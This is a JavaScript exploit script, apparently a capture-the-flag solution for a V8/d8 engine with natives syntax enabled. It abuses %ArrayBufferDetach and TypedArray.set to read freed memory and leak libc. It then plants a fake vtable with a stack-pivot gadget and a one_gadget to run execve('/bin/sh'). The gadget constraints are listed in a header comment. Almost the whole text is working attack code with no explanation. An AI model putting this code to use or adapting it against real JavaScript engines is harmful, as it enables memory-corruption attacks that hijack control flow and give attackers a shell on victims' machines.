
/*
 * xchg rax, rsp ;
 * and al, 0x90 ;
 * add byte ptr [rax], al ;
 * add byte ptr [rcx], bh ;
 * ret 0x427e
 *
 * 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
 * constraints:
 *   rsp & 0xf == 0
 *   rcx == NULL
 *
 * 0x4f322 execve("/bin/sh", rsp+0x40, environ)
 * constraints:
 *   [rsp+0x40] == NULL
 *
 * 0x10a38c execve("/bin/sh", rsp+0x70, environ)
 * constraints:
 *   [rsp+0x70] == NULL
 */
var x = new Uint8Array(0x600);
var y = new Uint8Array(0x600);
var x_view = new BigUint64Array(x.buffer);

%ArrayBufferDetach(y.buffer);
x.set(y);

const libc_addr = x_view[0] - 0x3ebca0n;
console.log('[*] libc @ 0x' + libc_addr.toString(16));

const xchg_gadget = libc_addr + 0xfacc5n;
console.log('[*] xchg_gadget @ 0x' + xchg_gadget.toString(16));

const ret_gadget = libc_addr + 0x8aan;
console.log('[*] ret_gadget @ 0x' + ret_gadget.toString(16));

const one_gadget_addr = libc_addr + 0x10a38cn;
console.log('[*] one_gadget @ 0x' + one_gadget_addr.toString(16));

var _a = new ArrayBuffer(0x30);
var _b = new ArrayBuffer(0x30);
var a = new BigUint64Array(_a);
var b = new BigUint64Array(_b);

%ArrayBufferDetach(a.buffer);

var buf = new ArrayBuffer(0x8);
var buffer_view = new BigUint64Array(buf);
var buffer_view_8 = new Uint8Array(buf);

var _fake_table = new ArrayBuffer(0x8000);
var fake_table = new BigUint64Array(_fake_table);
var fake_table_8 = new Uint8Array(_fake_table);

b.set(a);
b[3] = b[0] + 8n; // Set vtable to fake_table[1];
a.set(b);

fake_table[0] = ret_gadget;
fake_table[1] = b[0];
fake_table[4] = xchg_gadget;

buffer_view[0] = one_gadget_addr
fake_table_8.set(buffer_view_8, 0x4286);

for (let i = 0; i < 0xffff; i++) {}
%ArrayBufferDetach(fake_table.buffer);

